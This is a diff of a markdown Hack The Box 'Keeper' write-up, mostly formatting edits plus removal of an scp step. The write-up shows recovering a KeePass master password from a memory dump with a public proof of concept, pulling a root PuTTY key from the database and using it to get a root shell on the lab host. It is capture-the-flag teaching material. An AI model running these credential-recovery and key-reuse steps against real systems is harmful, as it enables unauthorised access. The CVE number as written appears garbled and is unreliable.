@@ -70,7 +70,9 @@ Archive:  RT30000.zip
 
 the zip file consists of a keepass database file and a password dump file. if we google “keepass vulnerability”, We come across **CVE-2023–3278**. Here, is the Proof of Concept for this vulnerability [here](https://github.com/z-jxy/keepass_dump/tree/main).
 
+```
 python3 keepass_dump.py -f KeePassDumpFull.dmp --skip --debug --recover
+```
 
 ![](https://miro.medium.com/v2/resize:fit:1262/1*MmC2fYL4GlrLrUtvB2GgbQ.png)
 
@@ -102,6 +104,8 @@ Press enter or click to view image in full size
 sudo apt-get install kpcli -y  
 ```
   
+
+```
 ┌──(kali㉿kali)-[~/Documents/HTB/keeper]  
 └─$ kpcli  
   
@@ -124,22 +128,26 @@ Internet/
 Network/  
 Recycle Bin/  
 Windows/
+```
 
-now that we are able to access the password database. In the network group we found two entries, one of which contains the root user password and a ssh-rsa key in it’s notes section.
+Now that we are able to access the password database. In the network group we found two entries, one of which contains the root user password and a ssh-rsa key in it’s notes section.
 
-Press enter or click to view image in full size
 
 ![](https://miro.medium.com/v2/resize:fit:1400/1*xv9NIZXnWBszqgRPN7snLw.png)
 
 if we use the **-f** argument to get the hidden password. Save this putty-user key in a file “ssh_key_file”. To convert this putty key to ssh-rsa key we’ll use puttygen utility for linux
 
+```
 puttygen ssh_key_file -O private-openssh -o id_rsa  
 chmod 600 id_rsa  
 ssh root@10.10.11.227 -i id_rsa
+```
+
 
 ![](https://miro.medium.com/v2/resize:fit:1114/1*8DrzaMUZGrJ13kzsxLQ8ug.png)
 
 And here we we’re able to successfully obtain the root shell and got the root flag!
+
 ### More Explanation
 
 >[!note] Why did we use puTTY ?
@@ -149,11 +157,3 @@ And here we we’re able to successfully obtain the root shell and got the root 
 >[!note] What is kpcli and Why did we use it ?
 >**kpcli** is a command-line interface for KeePass database files, allowing you to manage and view your passwords directly from a Linux terminal without needing a graphical interface. It’s essentially a "shell" specifically designed to navigate the folders and entries of a `.kdbx` file using familiar commands like `ls` and `cd`.
 
-
-Download ssh files into my machine : 
-
-```
-$ scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip . 
-lnorgaard@keeper.htb's password: 
-RT30000.zip
-```
